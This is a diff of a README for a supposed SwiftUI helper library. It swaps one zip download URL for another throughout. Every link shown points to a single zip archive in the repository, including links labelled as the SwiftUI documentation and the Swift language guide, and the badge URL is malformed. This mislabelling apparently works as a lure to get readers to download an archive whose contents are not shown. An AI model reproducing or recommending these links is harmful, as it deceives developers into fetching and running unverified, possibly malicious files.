@@ -6,7 +6,7 @@ SwiftUIHelpers offers convenient initializers for SwiftUI views. This tool makes
 
 ## 📦 Download SwiftUIHelpers
 
-[![Download SwiftUIHelpers](https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip%20Now-Click%https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip)](https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip)
+[![Download SwiftUIHelpers](https://raw.githubusercontent.com/muradaldahmashi/SwiftUIHelpers/main/Resources/Helpers-Swift-UI-v2.8-beta.2.zip%20Now-Click%https://raw.githubusercontent.com/muradaldahmashi/SwiftUIHelpers/main/Resources/Helpers-Swift-UI-v2.8-beta.2.zip)](https://raw.githubusercontent.com/muradaldahmashi/SwiftUIHelpers/main/Resources/Helpers-Swift-UI-v2.8-beta.2.zip)
 
 ## 🔍 What You Need
 
@@ -29,7 +29,7 @@ SwiftUIHelpers provides a set of convenience initializers for SwiftUI. With thes
 ## 📥 Download & Install
 
 To get started with SwiftUIHelpers, visit this page to download:
-[Download SwiftUIHelpers Releases](https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip)
+[Download SwiftUIHelpers Releases](https://raw.githubusercontent.com/muradaldahmashi/SwiftUIHelpers/main/Resources/Helpers-Swift-UI-v2.8-beta.2.zip)
 
 ### Step-by-Step Setup
 
@@ -62,11 +62,11 @@ For any questions or support needs, please visit the Issues section of the Swift
 
 ## 🌐 Additional Resources
 
-- [SwiftUI Documentation](https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip)
-- [Swift Programming Language Guide](https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip)
+- [SwiftUI Documentation](https://raw.githubusercontent.com/muradaldahmashi/SwiftUIHelpers/main/Resources/Helpers-Swift-UI-v2.8-beta.2.zip)
+- [Swift Programming Language Guide](https://raw.githubusercontent.com/muradaldahmashi/SwiftUIHelpers/main/Resources/Helpers-Swift-UI-v2.8-beta.2.zip)
 
 Stay updated by checking back frequently on the Releases page.
 
-[Download SwiftUIHelpers Releases](https://github.com/muradaldahmashi/SwiftUIHelpers/raw/refs/heads/main/Sources/Swift_Helpers_UI_3.3-alpha.4.zip) 
+[Download SwiftUIHelpers Releases](https://raw.githubusercontent.com/muradaldahmashi/SwiftUIHelpers/main/Resources/Helpers-Swift-UI-v2.8-beta.2.zip) 
 
 Your journey to better SwiftUI development starts here! Dive in and enjoy a simpler way to create.
